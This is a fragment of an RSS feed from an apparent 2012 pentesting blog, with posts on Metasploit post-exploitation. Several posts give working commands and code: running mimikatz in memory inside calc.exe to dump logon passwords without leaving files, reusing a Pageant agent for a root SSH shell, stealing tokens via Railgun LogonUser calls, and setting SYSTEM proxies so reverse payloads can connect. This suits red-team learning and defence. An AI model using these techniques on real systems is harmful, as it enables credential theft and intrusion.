+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_bypassuac_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and yes it supports EXE::Custom.&lt;/p&gt;
+
+&lt;p&gt;2) It lets you know if it will be able to bypass the current setting of UAC or not:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_bypassuac_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Even when you&amp;rsquo;re going overkill with it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_bypassuac_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(ASK module if UAC is disabled will just elevate without any kind of user prompt)&lt;/p&gt;
+
+&lt;p&gt;And of course it works as expected if UAC needs bypassing:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_bypassuac_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;One thing I have yet to update is a simple check to make sure you are an admin that can actually bypass UAC. If you aren&amp;rsquo;t, then you&amp;rsquo;ll be leaving this lovely calling card behind for the user:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_bypassuac_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Setting SYSTEM&#39;s proxy settings with Metasploit</title>
+      <link>http://room362.com/post/2012/2012-10-21-setting-systems-proxy-settings-with-metasploit/</link>
+      <pubDate>Sun, 21 Oct 2012 07:40:11 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2012/2012-10-21-setting-systems-proxy-settings-with-metasploit/</guid>
+      <description>&lt;p&gt;One of the great things about the reverse_http(s) payloads is that it is proxy aware. However one of the pitfalls to this is that SYSTEM doesn&amp;rsquo;t have proxy settings, nor do users who have never logged into a system (unless profile loading is triggered). The problem here arrises when you are trying to do anything as SYSTEM, also the PSEXEC only has the option of getting you a SYSTEM shell (so you&amp;rsquo;re done for right out of the door)&lt;/p&gt;
+
+&lt;p&gt;Now, there is a stub in Metasploit that I have been unable to complete due to my lack of knowledge in the shell code world. The stub allows you to create payloads that have static proxies, which basically invalidates the need for the following. Until then here is a few ways to set / read the proxy settings for SYSTEM or any other user for that matter.&lt;/p&gt;
+
+&lt;p&gt;Its here if you want to take a whack at it: &lt;code&gt;external/source/shellcode/windows/x86/src/block/block_reverse_https_proxy.asm&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;One of the ways @&lt;a href=&#34;https://twitter.com/carnal0wnage&#34;&gt;carnal0wnage&lt;/a&gt; and I demoed @&lt;a href=&#34;https://twitter.com/derbycon&#34;&gt;DerbyCon&lt;/a&gt; was using the bitsadmin binary. Windows7/Vista/2008 come with version 2.0+ which has this great ability to run the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;bitsadmin /util /setieproxy localsystem MANUAL_PROXY 192.168.1.55:3128 &amp;quot;;&amp;quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;(2000,XP,2003 you could upload a copy of bitsadmin that was new enough and that would still work)&lt;/p&gt;
+
+&lt;p&gt;That command sets the proxy settings for the SYSTEM account. I was able to jump through hoops and do this remotely by using the windows/exec payload via psexec, then reverse_http(s) would work.&lt;/p&gt;
+
+&lt;p&gt;But I wanted a better way to do this. I watched the execution of bitsadmin to see what it was doing and all it was actually doing is setting a registry key. Awesome, I can do that.&lt;/p&gt;
+
+&lt;p&gt;Enter enum_proxy:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_proxy_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_proxy_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If you&amp;rsquo;ve noticed that RHOST option, Metasploit has the ability to do remote registry calls as well (this module will attempt to start the RemoteRegistry service if the user has the privilege to do so):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_proxy_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Output from it finding a disabled RemoteRegistry:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf post(enum_proxy) &amp;gt; run
+
+[-] Unable to contact remote registry service on 172.16.10.217
+[*] Attempting to start service remotely...
+[*] Proxy Counter = 9
+[*] Setting: WPAD and AutoConfigure script
+[*] AutoConfigURL: http://anotherproxyserver/pac.pac
+[*] Post module execution completed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;ldquo;Awesome but you promised setting the proxy settings&amp;rdquo;, well right now all I can give you is a cloner ;-)&lt;/p&gt;
+
+&lt;p&gt;Enter clone_proxy_settings module:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_proxy_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And thats it. Still working on an actual &amp;ldquo;set_proxy&amp;rdquo; module, but this should do for now, and a lot less to type.&lt;/p&gt;
+
+&lt;p&gt;As of this post both are currently pull requests:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/942&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/942&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/943&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/943&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Mounting SMB shares over Meterpreter</title>
+      <link>http://room362.com/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/</link>
+      <pubDate>Wed, 17 Oct 2012 17:52:30 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/</guid>
+      <description>&lt;p&gt;Ok, this is pretty straight forward no magic:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_smb_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Got a shell, doesn&amp;rsquo;t have to be SYSTEM&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_smb_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Add a route to the internal range or directly to the host you want over the session you want&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_smb_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Mosy on over  to the Socks4a module. And in another terminal we need to make sure our proxychains.conf file in /etc/ or where ever you store your conf is correct. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_smb_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It defaults to 9050 on 127.0.01 for Tor, that&amp;rsquo;s pretty easy to cope with and no reason to mess with it if you actually use it for Tor for other things.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_smb_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Run the socks proxy with the Tor-like settings. (Remember to shutdown Tor first)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_smb_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And the rest is gravy. The % (percent sign if blog software mangles it) is a delimiter that smbclient and other samba tools recognize between user and password (so it doesn&amp;rsquo;t prompt you for it).&lt;/p&gt;
+
+&lt;p&gt;And just to love it working:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_smb_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;yay files.. Yes I know I didn&amp;rsquo;t use smbmount but it works the same as well as rpcclient.&lt;/p&gt;
+
+&lt;p&gt;A side note here is if you are using the pth-tools from:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://code.google.com/p/passing-the-hash/&#34;&gt;https://code.google.com/p/passing-the-hash/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;You can use hashes instead of passwords for stuff like this. But who are we kidding? Who doesn&amp;rsquo;t get clear text passwords anymore ;-)&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Meet “q” – Free Metasploit Exploit Pack</title>
+      <link>http://room362.com/post/2012/2012-10-04-meet-q-free-metasploit-exploit-pack-html/</link>
+      <pubDate>Thu, 04 Oct 2012 09:07:57 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2012/2012-10-04-meet-q-free-metasploit-exploit-pack-html/</guid>
+      <description>&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_q_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once you’re done staring at the Star Trek deity above (it’s a staring contest you will loose since you a such a simplistic race). I pull your attention to: &lt;a href=&#34;https://github.com/mubix/q&#34;&gt;https://github.com/mubix/q&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;This repository / exploit pack was created for the sole purpose to house modules, scripts and resource files that would otherwise not be accepted into the Metasploit trunk. It will always be free and anyone is free to submit pulls of modules, scripts or resource files that they created &lt;strong&gt;or just found&lt;/strong&gt; and were not accepted to the trunk because it was just a script, it violates TOS of a service, they did not author it, or any other possible reason. (Like the fear of @egyp7 ‘s coding red pen)&lt;/p&gt;
+
+&lt;p&gt;While I completely understand the reason and possible backlash Metasploit and subsequently Rapid7 might get for housing modules that were not submitted by their original owners, or violate some TOS, I feel that those modules should not simply disappear into time.&lt;/p&gt;
+
+&lt;p&gt;With that said, if a module gets added to this repo by another person and the other contacts me to take it down I certainly will.&lt;/p&gt;
+
+&lt;p&gt;So if you have modules, scripts, resource files or anything else that you would like to share, please submit a pull request, and we’ll see about getting it shared out for other people to use.&lt;/p&gt;
+
+&lt;p&gt;P.S. I am, as evident by this blog, a friend of the framework, so I would do my best to remove the blockage that is stopping the item from being in the Metasploit trunk if at all possible. This repo / exploit pack is meant to support the framework, not subjugate it in any way.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Completely In-memory Mimikatz with Metasploit</title>
+      <link>http://room362.com/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/</link>
+      <pubDate>Thu, 06 Sep 2012 03:16:47 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/</guid>
+      <description>&lt;p&gt;Executing WCE.exe in memory as demoed by Egypt here: &lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram&#34;&gt;https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram&lt;/a&gt; has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&amp;rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201209_mimikatz_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;(yes I realize I&amp;rsquo;m running this on disk &amp;lsquo;wce32.exe&amp;rsquo;, but it exhibits the same DLL drop when doing in-memory)&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, don&amp;rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&amp;rsquo;s the best tool for the job. And today, that&amp;rsquo;s now Mimikatz. &lt;/p&gt;
+
+&lt;p&gt;Just like WCE to execute it in memory you use the -m flag for execute:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;meterpreter&amp;gt; execute -H -i -c -m -d calc.exe -f mimikatz.exe -a &#39;&amp;quot;sekurlsa::logonPasswords full&amp;quot; exit&#39;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;For mimikatz to automatically send commands require double quotes in the command line arguments, so we use single quotes in meterpreter to encircle the execute arguments (-a). Running first &amp;ldquo;sekurlsa::logonPasswords full&amp;rdquo; then &amp;lsquo;exit&amp;rsquo; to auto-exit mimikatz console. Like so:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201209_mimikatz_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And all you get forensically is calc.exe loading a ton of DLLs it has no business loading but no new files touch disk ;-)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201209_mimikatz_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The downloads for Mimikatz are were they always are: &lt;a href=&#34;http://blog.gentilkiwi.com/mimikatz&#34;&gt;http://blog.gentilkiwi.com/mimikatz&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Oh, did I mention that Mimikatz is open source and the in-memory goodness has been uploaded to svn: &lt;a href=&#34;https://code.google.com/p/mimikatz/&#34;&gt;https://code.google.com/p/mimikatz/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Awesome work &lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;If you want to check out the the fix that was implemented to work with Meterpreter&amp;rsquo;s in-memory goodness check here: &lt;a href=&#34;https://code.google.com/p/mimikatz/source/detail?r=33&#34;&gt;https://code.google.com/p/mimikatz/source/detail?r=33&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Free Shells with Plink and Pageant</title>
+      <link>http://room362.com/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</link>
+      <pubDate>Tue, 28 Aug 2012 15:42:03 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</guid>
+      <description>&lt;p&gt;Watching &lt;a href=&#34;http://twitter.com/egyp7&#34;&gt;Egypt&lt;/a&gt;’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run enum_putty
+[*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]]
+[*] Saved SSH Server Public Keys:
+[*]     rsa2@22:172.16.10.150
+[*] Session corp_webserver:
+[*]     Protocol: SSH
+[*]     Hostname: 172.16.10.150
+[*]     Username: root
+[*]     Public Key:
+meterpreter &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Awesome, this guy runs as root and we have the IP address. But it doesn’t have any public keys listed. That’s ok because Pageant is running.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; shell
+Process 3364 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Program Files\PuTTY&amp;gt;plink -agent root@172.16.10.150
+plink -agent root@172.16.10.150
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 2.6.39.1-34 i686)
+No mail.
+Last login: Tue Aug 28 14:15:18 2012 from 172.16.10.100
+root@172.16.10.150:~]$ id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;w00t! An extra shell for free!!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201208_freeshells_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Raising Zombies in Windows: Part 1 - Passwords</title>
+      <link>http://room362.com/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</link>
+      <pubDate>Tue, 31 Jul 2012 20:20:15 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</guid>
+      <description>&lt;p&gt;With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&amp;rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&amp;rsquo;t really appreciative of our (pentester/red teamer)&amp;rsquo;s schedule.&lt;/p&gt;
+
+&lt;p&gt;A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &amp;lsquo;runas.exe&amp;rsquo;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201207_zombies_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&amp;rsquo;re good right? Problem there is you have to interactively input the password, so without a real cmd.exe or RDP session of your own, (VNC payload would work), you&amp;rsquo;re generally SOL.&lt;/p&gt;
+
+&lt;p&gt;There are a ton of posted ways around this, most involve make a wrapper script to input the password for you such as this one:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201207_zombies_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(this was pretty unique as it actually sent the keys to the key buffer instead of directly to STDIN)&lt;/p&gt;
+
+&lt;p&gt;Another way if you don&amp;rsquo;t mind dropping / creating a custom bin, AutoIT makes this REALLY simple:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201207_zombies_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This could be 2 lines if you really wanted it to be but I like to make things a bit more universal. You could also execute this directly in memory with meterepreter&amp;rsquo;s execute command with the &amp;ldquo;-m&amp;rdquo; argument after you&amp;rsquo;ve built the AutoIT script into a EXE.&lt;/p&gt;
+
+&lt;p&gt;But what go through all that trouble? Railgun can do this just as easily. Drop to IRB or create a script that does the following:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;a = client.railgun.kernel32.GetStartupInfoW(56)[&amp;quot;lpStartupInfo&amp;quot;]
+client.railgun.advapi32.CreateProcessWithLogonW(&amp;quot;USER&amp;quot;,&amp;quot;DOMAIN&amp;quot;,&amp;quot;PASSWORD&amp;quot;,&amp;quot;LOGON_WITH_PROFILE&amp;quot;,&amp;quot;notepad.exe&amp;quot;,nil,0,nil,nil,a,32)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This will create a notepad.exe process with the defined user. But we can go a bit more stealthy, since we really only need their account token we can just user LogonUser:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.advapi32.LogonUserA(&amp;quot;USER&amp;quot;,&amp;quot;DOMAIN&amp;quot;,&amp;quot;PASSWORD&amp;quot;,&amp;quot;LOGON32_LOGON_INTERACTIVE&amp;quot;,&amp;quot;LOGON32_PROVIDER_DEFAULT&amp;quot;,4)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;List the tokens available with Incognito, your new user will be there, steal it and you&amp;rsquo;re done. You now have the ability to user that account/domain token on any of the hosts you&amp;rsquo;ve compromised on the network, not just the ones they happen to have left themselves logged in. This gets really fun on servers where the admin hasn&amp;rsquo;t logged in but you wanna grab all of their IE saved passwords ;-)&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
